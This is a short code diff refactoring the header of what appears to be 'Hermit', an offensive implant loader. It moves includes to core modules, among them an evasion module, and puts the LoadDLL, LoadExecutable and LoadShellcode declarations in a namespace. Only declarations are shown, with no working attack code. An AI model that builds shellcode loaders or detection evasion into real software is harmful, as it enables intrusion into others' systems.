@@ -1,15 +1,18 @@
-#ifndef HERMIT_HERMIT_HPP
-#define HERMIT_HERMIT_HPP
+#ifndef HERMIT_HPP
+#define HERMIT_HPP
 
 #include <windows.h>
 #include <winhttp.h>
-#include "common.hpp"
-#include "inject.hpp"
-#include "winhttp.hpp"
-#include "winsystem.hpp"
+#include "core/evasion.hpp"
+#include "core/handler.hpp"
+#include "core/system.hpp"
+#include "core/utils.hpp"
 
-BOOL LoadDLL();
-BOOL LoadExecutable();
-BOOL LoadShellcode();
+namespace Hermit
+{
+    BOOL LoadDLL();
+    BOOL LoadExecutable();
+    BOOL LoadShellcode();
+}
 
-#endif // HERMIT_HERMIT_HPP
+#endif // HERMIT_HPP
